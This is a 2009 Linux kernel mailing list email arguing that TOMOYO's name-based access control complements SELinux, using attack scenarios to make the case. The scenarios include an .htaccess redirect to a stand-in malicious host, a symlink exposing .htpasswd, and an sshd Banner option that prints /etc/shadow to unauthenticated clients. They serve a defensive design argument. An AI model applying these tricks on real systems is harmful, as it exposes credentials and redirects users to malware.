Return-Path: <linux-kernel-owner+w=401wt.eu-S1751421AbZL2NBc@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1751421AbZL2NBc (ORCPT <rfc822;w@1wt.eu>);
	Tue, 29 Dec 2009 08:01:32 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1751206AbZL2NBb
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Tue, 29 Dec 2009 08:01:31 -0500
Received: from wine.ocn.ne.jp ([122.1.235.145]:61634 "EHLO smtp.wine.ocn.ne.jp"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1751043AbZL2NBb (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Tue, 29 Dec 2009 08:01:31 -0500
To: Valdis.Kletnieks@vt.edu
Cc: serge@hallyn.com, serue@us.ibm.com, linux-kernel@vger.kernel.org,
       linux-security-module@vger.kernel.org
Subject: Label based MAC + Name based MAC (was Re: A basic question about the security_* hooks)
From: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>
References: <20091227031631.GA17629@hallyn.com>
	<200912271302.JBH64754.JtLMFQVOSOFFHO@I-love.SAKURA.ne.jp>
	<22669.1261911374@localhost>
	<200912282051.BIF64080.VOMtFOOLSHJFFQ@I-love.SAKURA.ne.jp>
	<9291.1262011906@localhost>
In-Reply-To: <9291.1262011906@localhost>
Message-Id: <200912292201.FGE12468.VJHLtSFOOFFMQO@I-love.SAKURA.ne.jp>
X-Mailer: Winbiff [Version 2.51 PL2]
X-Accept-Language: ja,en,zh
Date: Tue, 29 Dec 2009 22:01:29 +0900
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Valdis.Kletnieks@vt.edu wrote:
> > Also, people know we sometimes need to restrict string parameters for avoiding
> > unwanted consequence. TOMOYO can pay attention to string parameters whereas
> > SELinux can't.
> 
> Which string parameters are these?

(1) Basename part of a file's pathname.
(2) Pathnames passed to directory entry manipulation functions.
(3) Pathnames passed to namespace manipulation functions.
(4) The content of symlink.
(5) Invocation name of a program (a.k.a. argv[0])
(6) Commandline arguments (a.k.a. argv[])
(7) Environment variables (a.k.a. envp[])

and probably more. Please understand that "Those who give insane input deserve
insane output." is not correct excuse. Without MAC, it is OK to say "If root
user did insane requests, nothing prevents from insane results". With MAC,
it is not OK to say so because MAC is sometimes used for dividing root's power
using RBAC (or similar). MAC is an approach for protecting from insane requests.

(1) Basename part of a file's pathname.

Suppose a storage administrator wants to schedule automatic fsck upon next
reboot. The security policy will be configured to allow creating a file
under / directory since the administrator wants to create /forcefsck .
But what happens if the administrator created /autorelabel on purpose or
accidentally? Relabeling operation will be done upon next reboot. If some
files are not located in place, the files will get improper labels.
Who knew that a storage administrator can change file's label that are not
in place?
We should have allowed the storage administrator to create only /forcefsck ,
shouldn't we?

Suppose CGI programs invoked by Apache create files dynamically.
The security policy will be configured to allow creating files under
/var/www/html/ directory since the CGI program wants to create 
/var/www/html/blog.dat and /var/www/html/index.dat .
But what happens if the CGI program had a security hole that allows
attackers to create /var/www/html/.htaccess with the content

  RedirectMatch (.*) http://evil.example.com/cgi-bin/poison-it?$1

? Apache will interpret /var/www/html/.htaccess and send HTTP 302 response
to web clients.
Who knew that the web server leads web clients to malware distributing site?
We should have allowed the CGI program to create only /var/www/html/blog.dat
and /var/www/html/index.dat , shouldn't we?

(2) Pathnames passed to directory entry manipulation functions.

Userland depends on whether files (programs, libraries, config files etc.) are
located in place or not. If we allow directory entry manipulation operations
wider than needed, the risk of files not located in place becomes larger.

I'm not saying that inode based access control is useless. I'm saying that
the granularity of inode based access control is not finest-grained because it
does not represent the parent/child relationship. For example, allowing rename
of "etc_t" is wider than needed. Only permission to rename from /etc/foo/bar to
/etc/foo/buz should be given if it is sufficient.

(3) Pathnames passed to namespace manipulation functions.

Same reasons to directory entry manipulation functions.

(4) The content of symlink.

Suppose CGI programs invoked by Apache create symlinks. The security policy
will be configured to allow creating symlinks under /var/www/html/ directory
since the CGI program wants to create symlink to /var/www/html/document.dat .
But what happens if the CGI program had a security hole that allows attackers
to create symlink to /var/www/html/.htpasswd ? Apache (or CGI programs) will
return the content of /var/www/html/.htpasswd .
Who knew that the web server discloses the password information to attackers?
We should have forbidden symlinking to /var/www/html/.htpasswd , shouldn't we?

(5) Invocation name of a program (a.k.a. argv[0])

Several programs (e.g. busybox) behave differently depending on the invocation
name. Suppose you want to allow printing only md5 of specified file.
If "cat" and "md5sum" are implemented as hard-linked binary program, executing
"md5sum" with argv[0] set to "cat" will act as "cat", which will print the
content of specified file rather than md5 of the file.

(6) Commandline arguments (a.k.a. argv[])

Suppose login administrator wants to restart ssh server. The security policy
will be configured to allow stopping and restarting /usr/sbin/sshd .
But what happens if the administrator restarted /usr/sbin/sshd as

  /usr/sbin/sshd -o 'Banner /etc/shadow'

? The content of /etc/shadow is printed to unauthenticated ssh clients.
Who knew that a login administrator can broadcast the content of /etc/shadow
when "cat /etc/shadow" is permitted to nobody?
We should have forbidden passing such commandline parameters, shouldn't we?

(7) Environment variables (a.k.a. envp[])

Environment variables affect the behavior of programs. For example, modifying
SHELLOPTS outside bash and executing bash script may cause unexpected results.
We should be careful about envp[] as well as argv[], shouldn't we?



I agree that SELinux / Smack can very well control whether the subject can
read/write/execute the object or not, but that is part of security.
Security still depends on how the subject uses the object if the subject can
access the object.
String parameters described above control how the subject uses the object.
TOMOYO provides ability to pay attention to string parameters listed above
(although currently not all functionalities are merged into mainline kernel).

> > Both SELinux and TOMOYO have ability to cover all processes (from /sbin/init
> > till /sbin/poweroff) or targeted processes (e.g. only daemons). But SELinux is
> > not widely used for protecting all processes. TOMOYO can provide some
> > protection for processes which SELinux doesn't protect.
> 
> OK, this was what I was talking about - what processes does TOMOYO protect
> that SELinux doesn't?  Or are you suggesting "use TOMOYO when using the SELinux
> 'targeted' policy that only tracks some processes"?

That depends on what Linux users want to do.
Some will use TOMOYO for protecting processes not protected by SELinux.
Others will use TOMOYO for protecting processes already protected by SELinux
(e.g. CGI programs from Apache) because what TOMOYO provides is what SELinux
doesn't provide.

> It would seem that a better
> solution there would be to just go ahead and use the 'strict' or 'mls' policies
> if you want coverage of all processes - having some processes under SELinux
> and some under TOMOYO rules is just asking for confusion...

Using 'strict' or 'mls' policies for protecting all processes is not the
solution I want.

The solution I want is systems with inode based MAC (e.g. SELinux / Smack) and
name based MAC (e.g. TOMOYO / AppArmor) enabled at the same time so that the
systems are protected by two approaches ("whether the subject can
read/write/execute the object or not" and "how the subject uses the object")
if Linux users can accept the risk of enabling both.

Regards.
